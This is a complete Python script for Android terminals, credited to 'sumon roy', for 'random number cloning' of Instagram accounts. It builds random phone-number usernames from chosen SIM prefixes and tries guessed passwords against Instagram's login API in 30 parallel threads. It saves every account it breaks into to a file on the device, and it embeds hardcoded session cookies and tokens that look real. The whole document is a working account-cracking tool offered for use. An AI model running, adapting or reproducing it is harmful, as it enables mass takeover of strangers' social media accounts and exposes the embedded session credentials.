###-------[IMPORT MODULES]-----------####
 
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
 
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
 
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
 
try:os.mkdir('/sdcard/XYZ')
except:pass
 
 
###-------[LOGO]-----------####
logo= f'''\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
\033[1;97m---------------------------------------------------'''
 
 
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
 
 
 
###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")
 
 
 
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
 
 
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m KING IS ALWAYS KING")
        print(f"\033[1;96m SOME RESPECT")
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200',uid[:6],uid[:8],uid] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()
 
 
###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            cookies = {
            'datr': 'lIB4aBrfVthN1_tPJkP4FZik',
            'ig_did': '9EB0467C-DAD0-42E2-B429-130B1EA59B96',
            'mid': 'aHiAlAALAAGaod0oZfM950AkBwnm',
            'ig_nrcb': '1',
            'csrftoken': csrftoken,
            'ds_user_id': '75581063753',
            'ps_l': '1',
            'ps_n': '1',
            'sessionid': '75581063753%3A4vhxbQFvUWAHDO%3A28%3AAYjRfm0CZXc7upp4wC0nnzmVuettGe891z5hjzgvAg',
            'rur': '"CCO\\05475581063753\\0541796905680:01fe9997eaf0060e52ab9ca3cf5bd174e0e82a544f19c09cfe01a101725ac255ccc182a9"',
            'wd': '1045x776',}
            data ={
            'enc_password': enc_password,
            'etoken': 'AbkPJww_lpsLjlOOYAZxBzmhTqjFG2VDTVoAoxFleQNb8QhjFDK_8XrxakUQ1qKSXM3YRoL0ok0LN6BNKeMUfhSm_CRPfe-FXKnz5mUuuf7Gi8fYtRY',
            'username': uid,
            'jazoest': '22713',}
            headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=AbkPJww_lpsLjlOOYAZxBzmhTqjFG2VDTVoAoxFleQNb8QhjFDK_8XrxakUQ1qKSXM3YRoL0ok0LN6BNKeMUfhSm_CRPfe-FXKnz5mUuuf7Gi8fYtRY&next=https%3A%2F%2Faccountscenter.facebook.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252F&flow=igcalcomettest&entry_point=fb_web_settings&initiator_fbid=100052156371595&is_initiator_feta=0&fbclid=IwY2xjawOmRplleHRuA2FlbQIxMABicmlkETFuU2VSZmNSTkl0Q3U3bWxTc3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHnmIuoDeyzCXp028q2Uwjk_wEW5OKyMwX0kOZSO3V5nKZe-AVoJPpHEC1eeo_aem_LFd4TGpGoC6WXASVfZ7xsg',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="143.0.3650.66", "Chromium";v="143.0.7499.41", "Not A(Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0',
            'x-asbd-id': '359341',
            'x-csrftoken': csrftoken,
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR2G1riIZ4mLPBSXPUUqgmOnbgrpY99QA_ZbByNjdANG35Sz',
            'x-instagram-ajax': '1030879028',
            'x-requested-with': 'XMLHttpRequest',
            'x-web-session-id': 'ipf4ju:10coml:tfm21r',}
            login_url = 'https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/'
            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
            session_cookies = response.cookies.get_dict()
            if response.status_code == 200:
                json_response = response.json()
                if json_response.get('status') == 'ok':
                   if json_response.get('authenticated') == True:
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        return True
                   elif json_response.get('auth_token'):
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        return True
            elif 'sessionid' in session_cookies:
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        return True
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass
menu()
 
